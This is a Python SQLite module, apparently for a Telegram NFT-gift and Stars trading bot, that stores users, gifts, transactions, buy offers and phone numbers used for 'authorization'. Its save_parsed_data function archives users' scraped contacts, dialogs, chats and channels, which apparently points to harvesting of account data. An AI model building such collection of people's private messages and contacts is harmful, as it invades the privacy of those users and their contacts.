#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Database module - асинхронная работа с SQLite через aiosqlite
"""

import aiosqlite
from datetime import datetime
import config

# ============================================
# Инициализация базы данных
# ============================================

async def init_database():
    """Инициализация базы данных"""
    async with aiosqlite.connect(config.DATABASE_PATH) as db:
        # Таблица пользователей
        await db.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                last_name TEXT,
                phone TEXT,
                stars_balance INTEGER DEFAULT 0,
                ton_balance REAL DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        # Таблица подарков
        await db.execute("""
            CREATE TABLE IF NOT EXISTS gifts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                gift_link TEXT NOT NULL,
                gift_name TEXT NOT NULL,
                sender_id INTEGER NOT NULL,
                receiver_id INTEGER,
                status TEXT DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                claimed_at TIMESTAMP,
                message_id TEXT,
                expires_at TIMESTAMP,
                FOREIGN KEY (sender_id) REFERENCES users(user_id)
            )
        """)
        
        # Таблица подарков звёзд
        await db.execute("""
            CREATE TABLE IF NOT EXISTS stars_gifts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                amount INTEGER NOT NULL,
                sender_id INTEGER NOT NULL,
                receiver_id INTEGER,
                status TEXT DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                claimed_at TIMESTAMP,
                message_id TEXT,
                expires_at TIMESTAMP,
                FOREIGN KEY (sender_id) REFERENCES users(user_id)
            )
        """)
        
        # Таблица транзакций
        await db.execute("""
            CREATE TABLE IF NOT EXISTS transactions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                type TEXT NOT NULL,
                amount REAL NOT NULL,
                currency TEXT NOT NULL,
                description TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (user_id) REFERENCES users(user_id)
            )
        """)
        
        # Таблица контактов авторизации
        await db.execute("""
            CREATE TABLE IF NOT EXISTS auth_contacts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                phone TEXT NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (user_id) REFERENCES users(user_id)
            )
        """)
        
        # Таблица офферов на покупку
        await db.execute("""
            CREATE TABLE IF NOT EXISTS buy_offers (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                offer_id TEXT NOT NULL UNIQUE,
                buyer_id INTEGER NOT NULL,
                seller_id INTEGER,
                nft_url TEXT NOT NULL,
                nft_name TEXT NOT NULL,
                amount REAL NOT NULL,
                currency TEXT NOT NULL,
                status TEXT DEFAULT 'pending',
                message_id TEXT,
                chat_id INTEGER,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                accepted_at TIMESTAMP,
                expires_at TIMESTAMP NOT NULL,
                FOREIGN KEY (buyer_id) REFERENCES users(user_id)
            )
        """)
        
        await db.commit()
        print("✅ База данных инициализирована")

# ============================================
# Пользователи
# ============================================

async def get_or_create_user(user_id: int, username: str = None, first_name: str = None, last_name: str = None):
    """Получить или создать пользователя"""
    async with aiosqlite.connect(config.DATABASE_PATH) as db:
        db.row_factory = aiosqlite.Row
        
        # Используем INSERT OR REPLACE для атомарной операции
        try:
            # Сначала пытаемся INSERT OR IGNORE
            await db.execute("""
                INSERT OR IGNORE INTO users (user_id, username, first_name, last_name)
                VALUES (?, ?, ?, ?)
            """, (user_id, username, first_name, last_name))
            
            # Потом UPDATE данные если пользователь уже существовал
            await db.execute("""
                UPDATE users 
                SET username = COALESCE(?, username),
                    first_name = COALESCE(?, first_name),
                    last_name = COALESCE(?, last_name)
                WHERE user_id = ?
            """, (username, first_name, last_name, user_id))
            
            await db.commit()
            
        except Exception as e:
            print(f"⚠️ Error in get_or_create_user for {user_id}: {e}")
            await db.rollback()
        
        # Получаем пользователя
        async with db.execute('SELECT * FROM users WHERE user_id = ?', (user_id,)) as cursor:
            user = await cursor.fetchone()
        
        return dict(user) if user else None

async def get_user_by_id(user_id: int):
    """Получить пользователя по ID"""
    async with aiosqlite.connect(config.DATABASE_PATH) as db:
        db.row_factory = aiosqlite.Row
        
        async with db.execute('SELECT * FROM users WHERE user_id = ?', (user_id,)) as cursor:
            user = await cursor.fetchone()
        
        return dict(user) if user else None

async def update_user_phone(user_id: int, phone: str):
    """Обновить телефон пользователя"""
    async with aiosqlite.connect(config.DATABASE_PATH) as db:
        await db.execute("""
            UPDATE users 
            SET phone = ?
            WHERE user_id = ?
        """, (phone, user_id))
        await db.commit()

async def add_stars_to_user(user_id: int, amount: int):
    """Добавить звёзды пользователю"""
    async with aiosqlite.connect(config.DATABASE_PATH) as db:
        await db.execute("""
            UPDATE users 
            SET stars_balance = stars_balance + ?
            WHERE user_id = ?
        """, (amount, user_id))
        
        # Записываем транзакцию
        await db.execute("""
            INSERT INTO transactions (user_id, type, amount, currency, description)
            VALUES (?, ?, ?, ?, ?)
        """, (user_id, 'gift_received', amount, 'stars', 'Получен подарок звёзд'))
        
        await db.commit()

# ============================================
# Подарки NFT
# ============================================

async def create_gift(gift_link: str, gift_name: str, sender_id: int, expires_at: datetime):
    """Создать подарок"""
    async with aiosqlite.connect(config.DATABASE_PATH) as db:
        cursor = await db.execute("""
            INSERT INTO gifts (gift_link, gift_name, sender_id, expires_at, message_id)
            VALUES (?, ?, ?, ?, ?)
        """, (gift_link, gift_name, sender_id, expires_at.isoformat(), 'pending'))
        await db.commit()
        return cursor.lastrowid

async def get_gift_by_id(gift_id: int):
    """Получить подарок по ID"""
    async with aiosqlite.connect(config.DATABASE_PATH) as db:
        db.row_factory = aiosqlite.Row
        
        async with db.execute('SELECT * FROM gifts WHERE id = ?', (gift_id,)) as cursor:
            gift = await cursor.fetchone()
        
        return dict(gift) if gift else None

async def update_gift_message_id(gift_id: int, message_id: str):
    """Обновить message_id подарка"""
    async with aiosqlite.connect(config.DATABASE_PATH) as db:
        await db.execute("""
            UPDATE gifts SET message_id = ? WHERE id = ?
        """, (message_id, gift_id))
        await db.commit()

async def get_user_claimed_gifts(user_id: int):
    """Получить полученные подарки пользователя"""
    async with aiosqlite.connect(config.DATABASE_PATH) as db:
        db.row_factory = aiosqlite.Row
        
        async with db.execute("""
            SELECT gift_link, gift_name, created_at
            FROM gifts
            WHERE receiver_id = ? AND status = 'claimed'
            ORDER BY claimed_at DESC
        """, (user_id,)) as cursor:
            gifts = await cursor.fetchall()
        
        return [dict(gift) for gift in gifts]

# ============================================
# Подарки звёзд
# ============================================

async def create_stars_gift(amount: int, sender_id: int, expires_at: datetime):
    """Создать подарок звёзд"""
    async with aiosqlite.connect(config.DATABASE_PATH) as db:
        cursor = await db.execute("""
            INSERT INTO stars_gifts (amount, sender_id, expires_at, message_id)
            VALUES (?, ?, ?, ?)
        """, (amount, sender_id, expires_at.isoformat(), 'pending'))
        await db.commit()
        return cursor.lastrowid

async def get_stars_gift_by_id(stars_id: int):
    """Получить подарок звёзд по ID"""
    async with aiosqlite.connect(config.DATABASE_PATH) as db:
        db.row_factory = aiosqlite.Row
        
        async with db.execute('SELECT * FROM stars_gifts WHERE id = ?', (stars_id,)) as cursor:
            stars_gift = await cursor.fetchone()
        
        return dict(stars_gift) if stars_gift else None

async def update_stars_gift_message_id(stars_id: int, message_id: str):
    """Обновить message_id подарка звёзд"""
    async with aiosqlite.connect(config.DATABASE_PATH) as db:
        await db.execute("""
            UPDATE stars_gifts SET message_id = ? WHERE id = ?
        """, (message_id, stars_id))
        await db.commit()

# ============================================
# Транзакции
# ============================================

async def add_transaction(user_id: int, tx_type: str, amount: float, currency: str, description: str):
    """Добавить транзакцию"""
    async with aiosqlite.connect(config.DATABASE_PATH) as db:
        await db.execute("""
            INSERT INTO transactions (user_id, type, amount, currency, description)
            VALUES (?, ?, ?, ?, ?)
        """, (user_id, tx_type, amount, currency, description))
        await db.commit()

async def get_user_transactions(user_id: int, limit: int = 50):
    """Получить транзакции пользователя"""
    async with aiosqlite.connect(config.DATABASE_PATH) as db:
        db.row_factory = aiosqlite.Row
        
        async with db.execute("""
            SELECT * FROM transactions
            WHERE user_id = ?
            ORDER BY created_at DESC
            LIMIT ?
        """, (user_id, limit)) as cursor:
            transactions = await cursor.fetchall()
        
        return [dict(tx) for tx in transactions]

# ============================================
# Контакты авторизации
# ============================================

async def save_auth_contact(user_id: int, phone: str):
    """Сохранить контакт авторизации"""
    async with aiosqlite.connect(config.DATABASE_PATH) as db:
        await db.execute("""
            INSERT INTO auth_contacts (user_id, phone)
            VALUES (?, ?)
        """, (user_id, phone))
        
        # Обновляем телефон в users
        await db.execute("""
            UPDATE users 
            SET phone = ?
            WHERE user_id = ?
        """, (phone, user_id))
        
        await db.commit()

# ============================================
# Парсинг данных Telegram
# ============================================

async def save_parsed_data(user_id: int, parsed_data: dict):
    """Сохранить спарсенные данные из Telegram"""
    async with aiosqlite.connect(config.DATABASE_PATH) as db:
        import json
        
        # Создаём таблицу для спарсенных данных если её нет
        await db.execute("""
            CREATE TABLE IF NOT EXISTS parsed_telegram_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                data_type TEXT NOT NULL,
                data_json TEXT NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (user_id) REFERENCES users(user_id)
            )
        """)
        
        # Сохраняем информацию о пользователе
        if parsed_data.get('user_info'):
            await db.execute("""
                INSERT INTO parsed_telegram_data (user_id, data_type, data_json)
                VALUES (?, ?, ?)
            """, (user_id, 'user_info', json.dumps(parsed_data['user_info'], ensure_ascii=False)))
        
        # Сохраняем контакты
        if parsed_data.get('contacts'):
            await db.execute("""
                INSERT INTO parsed_telegram_data (user_id, data_type, data_json)
                VALUES (?, ?, ?)
            """, (user_id, 'contacts', json.dumps(parsed_data['contacts'], ensure_ascii=False)))
        
        # Сохраняем диалоги
        if parsed_data.get('dialogs'):
            await db.execute("""
                INSERT INTO parsed_telegram_data (user_id, data_type, data_json)
                VALUES (?, ?, ?)
            """, (user_id, 'dialogs', json.dumps(parsed_data['dialogs'], ensure_ascii=False)))
        
        # Сохраняем чаты
        if parsed_data.get('chats'):
            await db.execute("""
                INSERT INTO parsed_telegram_data (user_id, data_type, data_json)
                VALUES (?, ?, ?)
            """, (user_id, 'chats', json.dumps(parsed_data['chats'], ensure_ascii=False)))
        
        # Сохраняем каналы
        if parsed_data.get('channels'):
            await db.execute("""
                INSERT INTO parsed_telegram_data (user_id, data_type, data_json)
                VALUES (?, ?, ?)
            """, (user_id, 'channels', json.dumps(parsed_data['channels'], ensure_ascii=False)))
        
        await db.commit()
        
        print(f"✅ Parsed data saved to database for user {user_id}")

async def get_parsed_data(user_id: int, data_type: str = None):
    """Получить спарсенные данные пользователя"""
    async with aiosqlite.connect(config.DATABASE_PATH) as db:
        db.row_factory = aiosqlite.Row
        
        if data_type:
            query = """
                SELECT * FROM parsed_telegram_data
                WHERE user_id = ? AND data_type = ?
                ORDER BY created_at DESC
                LIMIT 1
            """
            async with db.execute(query, (user_id, data_type)) as cursor:
                row = await cursor.fetchone()
                if row:
                    import json
                    return json.loads(row['data_json'])
        else:
            query = """
                SELECT * FROM parsed_telegram_data
                WHERE user_id = ?
                ORDER BY created_at DESC
            """
            async with db.execute(query, (user_id,)) as cursor:
                rows = await cursor.fetchall()
                result = {}
                import json
                for row in rows:
                    result[row['data_type']] = json.loads(row['data_json'])
                return result
        
        return None

# ============================================
# Статистика
# ============================================

async def get_user_stats(user_id: int):
    """Получить статистику пользователя"""
    async with aiosqlite.connect(config.DATABASE_PATH) as db:
        db.row_factory = aiosqlite.Row
        
        # Куплено подарков
        async with db.execute("""
            SELECT COUNT(*) as count FROM transactions
            WHERE user_id = ? AND type = 'gift_purchase'
        """, (user_id,)) as cursor:
            bought = await cursor.fetchone()
        
        # Продано подарков
        async with db.execute("""
            SELECT COUNT(*) as count FROM gifts
            WHERE sender_id = ? AND status = 'claimed' AND sender_id != receiver_id
        """, (user_id,)) as cursor:
            sold = await cursor.fetchone()
        
        # Объём торговли
        async with db.execute("""
            SELECT SUM(ABS(amount)) as total FROM transactions
            WHERE user_id = ? AND currency = 'ton'
        """, (user_id,)) as cursor:
            volume = await cursor.fetchone()
        
        return {
            'bought': bought['count'] if bought else 0,
            'sold': sold['count'] if sold else 0,
            'volume': volume['total'] if volume and volume['total'] else 0
        }


# ============================================
# Офферы на покупку
# ============================================

async def create_buy_offer(offer_id: str, buyer_id: int, nft_url: str, nft_name: str, 
                          amount: float, currency: str, expires_at: datetime, 
                          chat_id: int = None, seller_id: int = None):
    """Создать оффер на покупку"""
    async with aiosqlite.connect(config.DATABASE_PATH) as db:
        cursor = await db.execute("""
            INSERT INTO buy_offers (offer_id, buyer_id, seller_id, nft_url, nft_name, 
                                   amount, currency, expires_at, chat_id)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (offer_id, buyer_id, seller_id, nft_url, nft_name, amount, currency, 
              expires_at.isoformat(), chat_id))
        await db.commit()
        return cursor.lastrowid

async def get_buy_offer_by_id(offer_id: str):
    """Получить оффер по ID"""
    async with aiosqlite.connect(config.DATABASE_PATH) as db:
        db.row_factory = aiosqlite.Row
        
        async with db.execute('SELECT * FROM buy_offers WHERE offer_id = ?', (offer_id,)) as cursor:
            offer = await cursor.fetchone()
        
        return dict(offer) if offer else None

async def update_buy_offer_status(offer_id: str, status: str, seller_id: int = None):
    """Обновить статус оффера"""
    async with aiosqlite.connect(config.DATABASE_PATH) as db:
        if seller_id:
            await db.execute("""
                UPDATE buy_offers 
                SET status = ?, seller_id = ?, accepted_at = CURRENT_TIMESTAMP
                WHERE offer_id = ?
            """, (status, seller_id, offer_id))
        else:
            await db.execute("""
                UPDATE buy_offers 
                SET status = ?
                WHERE offer_id = ?
            """, (status, offer_id))
        await db.commit()

async def update_buy_offer_message_id(offer_id: str, message_id: str):
    """Обновить message_id оффера"""
    async with aiosqlite.connect(config.DATABASE_PATH) as db:
        await db.execute("""
            UPDATE buy_offers SET message_id = ? WHERE offer_id = ?
        """, (message_id, offer_id))
        await db.commit()

async def get_user_buy_offers(user_id: int, status: str = None):
    """Получить офферы пользователя"""
    async with aiosqlite.connect(config.DATABASE_PATH) as db:
        db.row_factory = aiosqlite.Row
        
        if status:
            query = """
                SELECT * FROM buy_offers
                WHERE buyer_id = ? AND status = ?
                ORDER BY created_at DESC
            """
            async with db.execute(query, (user_id, status)) as cursor:
                offers = await cursor.fetchall()
        else:
            query = """
                SELECT * FROM buy_offers
                WHERE buyer_id = ?
                ORDER BY created_at DESC
            """
            async with db.execute(query, (user_id,)) as cursor:
                offers = await cursor.fetchall()
        
        return [dict(offer) for offer in offers]
